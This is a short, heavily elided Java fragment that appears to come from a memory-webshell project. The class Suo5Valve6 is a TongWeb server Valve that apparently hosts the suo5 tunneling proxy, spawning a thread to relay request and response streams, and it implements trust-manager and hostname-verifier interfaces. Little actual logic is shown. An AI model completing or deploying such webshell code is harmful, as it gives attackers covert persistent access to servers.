package com.reajason.javaweb.memshell.tongweb.suo5;
 ...
 * @author ReaJason
 */
public class Suo5Valve6 implements Valve, Runnable, HostnameVerifier, X509TrustManager {
    ...
    public Suo5Valve6(InputStream gInStream, OutputStream gOutStream) {
...
//                e.printStackTrace();
    ...
    private void processDataBio(HttpServletRequest request, HttpServletResponse resp) throws Exception {
        ...
        Thread t = null;
        try {
            Suo5Valve6 p = new Suo5Valve6(scInStream, respOutStream);
            t = new Thread(p);
            t.start();
